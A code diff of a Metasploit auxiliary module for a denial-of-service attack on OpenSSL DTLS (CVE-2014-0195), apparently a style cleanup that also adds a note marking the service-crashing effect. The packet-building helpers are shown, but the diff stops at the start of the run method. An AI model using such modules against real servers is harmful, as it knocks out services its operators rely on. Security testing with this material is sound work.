@@ -8,39 +8,45 @@ class MetasploitModule < Msf::Auxiliary
   include Exploit::Remote::Udp
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'OpenSSL DTLS Fragment Buffer Overflow DoS',
-      'Description' => %q{
-        This module performs a Denial of Service Attack against Datagram TLS in
-        OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.
-        This occurs when a DTLS ClientHello message has multiple fragments and the
-        fragment lengths of later fragments are larger than that of the first, a
-        buffer overflow occurs, causing a DoS.
-      },
-      'Author'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'OpenSSL DTLS Fragment Buffer Overflow DoS',
+        'Description' => %q{
+          This module performs a Denial of Service Attack against Datagram TLS in
+          OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.
+          This occurs when a DTLS ClientHello message has multiple fragments and the
+          fragment lengths of later fragments are larger than that of the first, a
+          buffer overflow occurs, causing a DoS.
+        },
+        'Author' => [
           'Juri Aedla <asd[at]ut.ee>', # Vulnerability discovery
           'Jon Hart <jon_hart[at]rapid7.com>' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2014-0195'],
           ['ZDI', '14-173'],
           ['BID', '67900'],
           ['URL', 'http://web.archive.org/web/20150815024234/http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002'],
           ['URL', 'http://web.archive.org/web/20140707160621/http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Once-Bled-Twice-Shy-OpenSSL-CVE-2014-0195/ba-p/6501048']
         ],
-      'DisclosureDate' => '2014-06-05'))
+        'DisclosureDate' => '2014-06-05',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options([
       Opt::RPORT(4433),
-      OptInt.new('VERSION', [true,  "SSl/TLS version", 0xFEFF])
+      OptInt.new('VERSION', [true, 'SSl/TLS version', 0xFEFF])
     ])
-
   end
 
-  def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body=nil)
+  def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body = nil)
     # format is: type (1 byte), total length (3 bytes), sequence # (2 bytes),
     # fragment offset (3 bytes), fragment length (3 bytes), fragment body
     sol = (seq << 48) | (frag_offset << 24) | frag_length
@@ -48,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
       (type << 24) | length,
       (sol >> 32),
       (sol & 0x00000000FFFFFFFF)
-    ].pack("NNN") + frag_body
+    ].pack('NNN') + frag_body
   end
 
   def build_tls_message(type, version, epoch, sequence, message)
@@ -61,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
       (es >> 32),
       (es & 0x00000000FFFFFFFF),
       message.length
-    ].pack("CnNNn") + message
+    ].pack('CnNNn') + message
   end
 
   def run
